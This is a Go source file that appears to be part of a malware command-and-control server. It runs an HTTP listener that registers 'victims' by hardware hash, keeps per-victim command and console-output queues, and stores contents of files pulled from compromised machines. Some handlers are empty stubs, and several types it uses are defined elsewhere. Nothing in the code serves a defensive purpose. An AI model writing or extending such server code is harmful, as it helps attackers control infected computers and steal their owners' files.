package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

// runs in a goroutine
func startServer() {
	http.HandleFunc("/proxy", proxyHandler)

	fmt.Println("Running on localhost:8888")

	err := http.ListenAndServe(":8888", nil)
	if err != nil {
		fmt.Println("The Server failed to run:", err)
	}
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	fmt.Println("Message recieved from: ", r.Host)

	//read the message received to our side (should be none with GET)
	message, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}
	
	//messages come in in the form need to separate them out 
	// "jsonIdentifier{json data}"
	designator, json, err := SeparateJsonDesignator(string(message))
	if(err != nil) {
		println("ERORR encountered could not separate strings correctly")
		return
	}

	switch designator {
	case "victimregister/json":
		resp := RegisterNewVictim(json)
		fmt.Fprintf(w, "%s" ,resp)
	case "requestCommand/json":
		resp := HandleIncomingRequest(json)
		fmt.Fprintf(w, "%s", resp)
	case "incomingData/json":
		resp := HandleIncomingData(json)
		fmt.Fprintf(w, "%s", resp)
	}
}

func HandleIncomingCatData(incomingSuperCatString string) {
	//convert the incoming json to the json object of IncomingSuperCatData
	//handle data this should be the contents of a file that was catted out
	//I would maybe suggest creating a datastream coming from the clients and put that on the RB tree=
	//holding all the hashes

	var catData IncomingSuperCatData

	err := json.Unmarshal([]byte(incomingSuperCatString), &catData)
	if err != nil {
		fmt.Println("Error decoding IncomingSuperCatData:", err)
		return
	}

	// Check if victim hash exists in clientTree
	clientTreeMutex.Lock()
	_, found := clientTree.Get(catData.Hash)
	clientTreeMutex.Unlock()

	if !found {
		fmt.Println("Supercat data rejected: hash not registered ->", catData.Hash)
		return
	}

	// Store in superCatTree
	superCatMutex.Lock()
	defer superCatMutex.Unlock()

	val, exists := superCatTree.Get(catData.Hash)
	if exists {
		list := val.([]IncomingSuperCatData)
		list = append(list, catData)
		superCatTree.Put(catData.Hash, list)
	} else {
		superCatTree.Put(catData.Hash, []IncomingSuperCatData{catData})
	}

	fmt.Printf("Stored supercat data for %s: %s\n", catData.Hash, catData.Filename)

}

func RegisterNewVictim(incomingJson string) (toReturn string){
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()
	
	println(incomingJson)

	//see if the incoming data is even valid
	var newVictimInfo VictimRegister
	err := json.Unmarshal([]byte(incomingJson), &newVictimInfo)
	if (err != nil || newVictimInfo.HardwareHash == ""){
		println(err, ":",  newVictimInfo.HardwareHash)
		var Response AssimilateResponse
		Response.ResponseCode   = 1
		Response.ResponseString = "Failure invalid"
		jsonResponse, _ :=json.Marshal(Response)
		return string(jsonResponse)
	}

	//see if the tree already has this entry
	_, exists := clientTree.Get(newVictimInfo.HardwareHash);
	if  (exists) {
		var Response AssimilateResponse
		Response.ResponseCode   = 1
		Response.ResponseString = "Failure invalid2"
		jsonResponse, _ :=json.Marshal(Response)
		return string(jsonResponse)
	}

	//if it makes it here its valid return a success and put into the tree
	victim := VictimInfo{
		Commands:    		[]VictimCommand{},
		VictimInfo:  		newVictimInfo,
		VictimConsoleOutput: []string{},
	}
	clientTree.Put(newVictimInfo.HardwareHash, victim)

	fmt.Println("Registered new client with hash:", newVictimInfo.HardwareHash)
	return ""
}

func HandleIncomingRequest(incomingJson string) (toreturn string){
	return ""
}

func HandleIncomingData(incomingJson string) (toreturn string){
	return ""
}